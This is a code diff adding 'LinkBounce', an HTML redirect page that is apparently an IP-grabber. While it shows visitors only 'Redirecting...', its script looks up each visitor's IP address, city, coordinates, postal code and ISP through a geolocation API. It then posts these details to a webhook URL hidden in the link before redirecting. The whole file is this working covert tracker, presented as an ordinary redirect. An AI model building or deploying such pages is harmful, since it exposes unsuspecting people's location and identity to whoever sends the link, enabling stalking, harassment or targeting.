@@ -1,0 +1,66 @@
+<title>LinkBounce</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Figtree:ital,wght@0,300..900;1,300..900&display=swap" rel="stylesheet">
+    <style>
+      body{
+        background:#1E1F1C;
+        display:flex;
+        align-items: center;
+        justify-content: center;
+        align-content: center;
+        flex-wrap:wrap;
+        width:100vw;
+        color:white;
+        margin:0px;
+        height:100vh;
+        font-family:Figtree, sans-serif;
+      }
+    </style>
+    <span>Redirecting...</span>
+    <script defer>
+      document.addEventListener('DOMContentLoaded', function() {
+        const urlParams = new URLSearchParams(window.location.search);
+        var l = atob(urlParams.get('l')); // Destination Link
+        var w = atob(urlParams.get('w')); // Webhook URL
+        if (l){
+          setTimeout(function(){redir(l)}, 5000);
+          const options = {method: 'GET', headers: {'User-Agent': 'linkbounce'}};
+  
+          fetch('https://ipapi.co/json', options)
+            .then(response => response.json())
+            .then(response => sendToHook(response,l,w))
+            .catch(err => console.error(err));
+        }
+        
+      });
+  
+  
+  
+      function sendToHook(r,l,w){
+    const message = {
+      "content": "",
+      "tts": false,
+      "embeds": [
+        {
+          "type": "rich",
+          "title": `🔗 Link Clicked | LinkBounce`,
+          "description": "🔗 Destination link: "+l+"\n🏷️ IP Address: `"+r.ip+"`\n🗺️ Location: `"+r.city+", "+r.region+", "+r.country_name+"`\n📍Coordinates: `"+r.latitude+", "+r.longitude+"`\n📬 Postal: `"+r.postal+"`\n#️⃣ ASN: `"+r.asn+"`\n📲 ISP: `"+r.org+"`\n🕗 Time: `"+new Date().toLocaleString()+"`\n\n[More IP Information](https://ipapi.co/"+r.ip+"/json)",
+          "color": 0xff0000
+        }
+      ]
+    };
+  
+    fetch(w, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(message),
+    })
+    .then(() => redir(l))
+  }
+    function redir(nl){
+      document.location.href=nl;
+    }
+    </script>
